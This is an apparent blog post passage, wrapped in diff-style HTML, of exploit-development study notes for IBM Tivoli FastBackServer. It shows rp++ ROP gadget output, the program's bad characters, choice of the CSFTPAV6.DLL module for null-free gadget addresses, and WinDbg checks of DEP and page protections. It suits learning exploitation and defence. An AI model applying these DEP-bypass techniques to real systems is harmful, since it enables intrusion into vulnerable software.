+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00569725</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; add byte [ebx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0BC0E8C8</span>], cl ; or eax, <span style="color:#ae81ff">0x5DE58B00</span> ; ret  ;  (<span style="color:#ae81ff">1</span> found)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x005417b2</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; call dword [<span style="color:#ae81ff">0x0067E494</span>] ;  (<span style="color:#ae81ff">1</span> found)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00541b78</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; call dword [<span style="color:#ae81ff">0x0067E494</span>] ;  (<span style="color:#ae81ff">1</span> found)
+</span></span></code></pre></div><p>We can see that for example the first found gadget is 5 instructions length.</p>
+<p>If we for example want to find only &ldquo;pop eax, ret&rdquo; simple gadgets, we can do it as each gadget sequence starts with &ldquo;:&rdquo;. Searching for &ldquo;: pop eax ; ret&rdquo; gives us this result:</p>
+<pre tabindex="0"><code>0x004f22f2: pop eax ; ret  ;  (1 found)
+0x004f2436: pop eax ; ret  ;  (1 found)
+0x0052f30c: pop eax ; ret  ;  (1 found)
+0x0061fdc4: pop eax ; ret  ;  (1 found)
+0x0066f936: pop eax ; ret  ;  (1 found)
+0x0066f98c: pop eax ; ret  ;  (1 found)
+0x0066fff0: pop eax ; ret  ;  (1 found)
+0x006701af: pop eax ; ret  ;  (1 found)
+0x00670628: pop eax ; ret  ;  (1 found)
+0x006705e0: pop eax ; ret  ;  (1 found)
+0x0067180c: pop eax ; ret  ;  (1 found)
+0x006723f6: pop eax ; ret  ;  (1 found)
+0x00673430: pop eax ; ret  ;  (1 found)
+0x006734ad: pop eax ; ret  ;  (1 found)
+0x006744ba: pop eax ; ret  ;  (1 found)
+0x0067456e: pop eax ; ret  ;  (1 found)
+0x00676646: pop eax ; ret  ;  (1 found)
+0x00676b17: pop eax ; ret  ;  (1 found)
+0x006770dd: pop eax ; ret  ;  (1 found)
+0x0067713a: pop eax ; ret  ;  (1 found)
+0x006779af: pop eax ; ret  ;  (1 found)
+0x006779c4: pop eax ; ret  ;  (1 found)
+0x00677bca: pop eax ; ret  ;  (1 found)
+0x00677e82: pop eax ; ret  ;  (1 found)
+0x006783e9: pop eax ; ret  ;  (1 found)
+</code></pre><p>Several memory locations where the same gadget resides, good for badchars and that stuff.</p>
+<p><strong>Note: when searching for badchars, if one char does not seem to be a badchar but the previous one, and when deleting the previous one, the other previous one is badchar also, and this is repeated, it is possible that the badchar is the char that does not seem to be it. I deleted 4 chars in a row thinking that they were badchars, but the actual badchar was after them.</strong>
+<strong>Note: common badchars are 00, 09 (HT),, 0b (VT), 0a (LF), 0c (FF), 0d (CR), 0x20 (space)</strong>
+The badchars for this program are:</p>
+<pre tabindex="0"><code>0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20
+</code></pre><p>Now, we have to locate gadgets to perform what we want. The problem is that the <strong>FastBackServer</strong> module is located at this address:</p>
+<pre tabindex="0"><code>0:061&gt; lm m FastBackServer
+Browse full module list
+start    end        module name
+00400000 00c0c000   FastBackServer   (deferred)    
+</code></pre><p>So bad as the gadgets from this module will always start at 00. As our payloads will be gadgets, which are memory address inside modules, we can&rsquo;t use this module for the gadgets. We need to find a different module that does not contain a null byte in the uppermost byte and one that is preferably part of the application. If we choose a module that is not part of the application, then the address of gadgets will vary depending on the patch level of the operating system.</p>
+<p><strong>Note: Native Windows modules often have additional protections enabled, which will require an even more advanced approach,</strong> therefore, it is recommended to always try to find modules that are native from the application.</p>
+<p>Doing &ldquo;lm m&rdquo; list us all the modules. We can go 1 by 1 and see which one is native from the application, and choose one.
+For example, this one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">061</span><span style="color:#f92672">&gt;</span> lmDvmCSFTPAV6
+</span></span><span style="display:flex;"><span>Browse full module list
+</span></span><span style="display:flex;"><span>start    end        module name
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50500000</span> <span style="color:#ae81ff">50577000</span>   <span style="color:#a6e22e">CSFTPAV6</span>   (deferred)             
+</span></span><span style="display:flex;"><span>    Image path: C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Tivoli<span style="color:#960050;background-color:#1e0010">\</span>TSM<span style="color:#960050;background-color:#1e0010">\</span>FastBack<span style="color:#960050;background-color:#1e0010">\</span>server<span style="color:#960050;background-color:#1e0010">\</span>CSFTPAV6.DLL
+</span></span><span style="display:flex;"><span>    Image name: CSFTPAV6.DLL
+</span></span><span style="display:flex;"><span>    Browse all global symbols  functions  data
+</span></span><span style="display:flex;"><span>    Timestamp:        Tue Jun  <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">36</span><span style="color:#f92672">:</span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">2010</span> (<span style="color:#ae81ff">4</span>C056121)
+</span></span><span style="display:flex;"><span>    CheckSum:         <span style="color:#ae81ff">0007</span><span style="color:#ae81ff">8277</span>
+</span></span><span style="display:flex;"><span>    ImageSize:        <span style="color:#ae81ff">00077000</span>
+</span></span><span style="display:flex;"><span>    File version:     <span style="color:#ae81ff">6.0.6030.1648</span>
+</span></span><span style="display:flex;"><span>    Product version:  <span style="color:#ae81ff">6.0.6030.1648</span>
+</span></span><span style="display:flex;"><span>    File flags:       <span style="color:#ae81ff">0</span> (Mask <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    File OS:          <span style="color:#ae81ff">4</span> Unknown Win32
+</span></span><span style="display:flex;"><span>    File type:        <span style="color:#ae81ff">2.0</span> Dll
+</span></span><span style="display:flex;"><span>    File date:        <span style="color:#ae81ff">00000000.00000000</span>
+</span></span><span style="display:flex;"><span>    Translations:     <span style="color:#ae81ff">0409.04e4</span>
+</span></span><span style="display:flex;"><span>    Information from resource tables:
+</span></span><span style="display:flex;"><span>        CompanyName:      Catalyst Development Corporation
+</span></span><span style="display:flex;"><span>        ProductName:      <span style="color:#a6e22e">SocketTools</span> (Win32)
+</span></span><span style="display:flex;"><span>        InternalName:     CSFTPAV6
+</span></span><span style="display:flex;"><span>        OriginalFilename: CSFTPAV6.DLL
+</span></span><span style="display:flex;"><span>        ProductVersion:   <span style="color:#ae81ff">6.0.6030.1648</span>
+</span></span><span style="display:flex;"><span>        FileVersion:      <span style="color:#ae81ff">6.0.6030.1648</span>
+</span></span><span style="display:flex;"><span>        FileDescription:  SocketTools File Transfer Protocol Library
+</span></span><span style="display:flex;"><span>        LegalCopyright:   Copyright <span style="color:#ae81ff">2010</span> Catalyst Development Corporation
+</span></span><span style="display:flex;"><span>        LegalTrademarks:  SocketTools is a trademark of Catalyst Development Corporation
+</span></span><span style="display:flex;"><span>        Comments:         This library may only be redistributed according to the terms of the developer license
+</span></span></code></pre></div><p>Let&rsquo;s use the rp++ tool to locate gadgets inside this DLL:</p>
+<pre tabindex="0"><code>rp-win-x86.exe -f csftpav6.dll -r 5 &gt; rop.txt
+</code></pre><p>We can see that the gadgets start by 0x50, not 0x00, so we &ldquo;bypassed&rdquo; the badchar restriction by choosing other module for our ROP gadgets:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Trying to open <span style="color:#960050;background-color:#1e0010">&#39;</span>C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Tivoli<span style="color:#960050;background-color:#1e0010">\</span>TSM<span style="color:#960050;background-color:#1e0010">\</span>FastBack<span style="color:#960050;background-color:#1e0010">\</span>server<span style="color:#960050;background-color:#1e0010">\</span>csftpav6.dll<span style="color:#960050;background-color:#1e0010">&#39;</span>..
+</span></span><span style="display:flex;"><span>Loading PE information..
+</span></span><span style="display:flex;"><span>FileFormat: PE, Arch: Ia32
+</span></span><span style="display:flex;"><span>Using the Nasm syntax..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Wait a few seconds, rp<span style="color:#f92672">++</span> is looking <span style="color:#66d9ef">for</span> gadgets..
+</span></span><span style="display:flex;"><span>in .text
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">28498</span> found.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>A total of <span style="color:#ae81ff">28498</span> gadgets found.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x505062c0</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; call dword [<span style="color:#ae81ff">0x5054A188</span>] ;  (<span style="color:#ae81ff">1</span> found)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x505072fa</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; call dword [<span style="color:#ae81ff">0x5055CA10</span>] ;  (<span style="color:#ae81ff">1</span> found)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x5050733a</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; call dword [<span style="color:#ae81ff">0x5055CA10</span>] ;  (<span style="color:#ae81ff">1</span> found)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x5050735c</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; call dword [<span style="color:#ae81ff">0x5055CA14</span>] ;  (<span style="color:#ae81ff">1</span> found)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x5050ae9f</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; inc eax ; pop esi ; pop edi ; retn <span style="color:#ae81ff">0x0004</span> ;  (<span style="color:#ae81ff">1</span> found)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x50507169</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; push ebx ; call dword [<span style="color:#ae81ff">0x5054A098</span>] ;  (<span style="color:#ae81ff">1</span> found)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x505212fe</span><span style="color:#f92672">:</span> aaa  ; add byte [ecx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3707D6C6</span>], al ; ret  ;  (<span style="color:#ae81ff">1</span> found)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x5051ec12</span><span style="color:#f92672">:</span> aaa  ; add dword [eax], eax ; add esp, <span style="color:#ae81ff">0x0C</span> ; pop ebp ; ret  ;  
+</span></span></code></pre></div><p><strong>Note: we can choose and mix different modules in case one module doesn&rsquo;t have the gadget we want.</strong></p>
+<h2 id="end-notes">End notes</h2>
+<p><strong>Note 1: In Windows, the PE file can have DEP disabled but you can enable DEP for the binary by using Windows Defender Exploit Guard in Windows Defender Security Center</strong>. Here is an example, which Narly doesn&rsquo;t detect DEP in the FastBackServer module as it reads the PE header, but DEP in the module is enforced by the OS:</p>
+<p><strong>Note2: In x64, opcodes differ in length, therefore the search of gadgets is dynamic and not deterministic. In other architectures with fixed opcode length (ARM &gt; 4 BYTES LENGTH), we just search for fixed offsets.</strong></p>
+<p><strong>Note 3: A way to check the protections of each memory page</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> .load narly
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>nmod
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">001</span>b0000 <span style="color:#ae81ff">001e3000</span> snclientapi          <span style="color:#f92672">/</span>SafeSEH OFF                C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Tivoli<span style="color:#960050;background-color:#1e0010">\</span>TSM<span style="color:#960050;background-color:#1e0010">\</span>FastBack<span style="color:#960050;background-color:#1e0010">\</span>server<span style="color:#960050;background-color:#1e0010">\</span>snclientapi.dll
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00400000</span> <span style="color:#ae81ff">00</span>c0c000 FastBackServer       <span style="color:#f92672">/</span>SafeSEH OFF                C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Tivoli<span style="color:#960050;background-color:#1e0010">\</span>TSM<span style="color:#960050;background-color:#1e0010">\</span>FastBack<span style="color:#960050;background-color:#1e0010">\</span>server<span style="color:#960050;background-color:#1e0010">\</span>FastBackServer.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// We can see that the exception is enforced when EIP points to the stack and executes code. DEP is enabled for this module.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span>  ed esp <span style="color:#ae81ff">90909090</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> r eip <span style="color:#f92672">=</span> esp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>vprot eip
+</span></span><span style="display:flex;"><span>BaseAddress:       <span style="color:#ae81ff">010</span>ef000
+</span></span><span style="display:flex;"><span>AllocationBase:    <span style="color:#ae81ff">00ff</span><span style="color:#ae81ff">0000</span>
+</span></span><span style="display:flex;"><span>AllocationProtect: <span style="color:#ae81ff">00000004</span>  PAGE_READWRITE
+</span></span><span style="display:flex;"><span>RegionSize:        <span style="color:#ae81ff">00001000</span>
+</span></span><span style="display:flex;"><span>State:             <span style="color:#ae81ff">00001000</span>  MEM_COMMIT
+</span></span><span style="display:flex;"><span>Protect:           <span style="color:#ae81ff">00000004</span>  PAGE_READWRITE
+</span></span><span style="display:flex;"><span>Type:              <span style="color:#ae81ff">00020000</span>  MEM_PRIVATE
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">p</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#ae81ff">158</span>c<span style="color:#ae81ff">.1110</span>)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
+</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
+</span></span><span style="display:flex;"><span>This exception may be expected and handled.
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00236000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>d9b350 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>d9b350 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>d9b350 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>d9b350
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">010</span>eff44 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">010</span>eff44 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">010</span>eff70 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010246</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">010</span>eff44 <span style="color:#ae81ff">90</span>              nop
+</span></span></code></pre></div></div>
+</article>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2025 &copy; made by jaco with love
+    </small></p>
+    <p><small>
+        Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
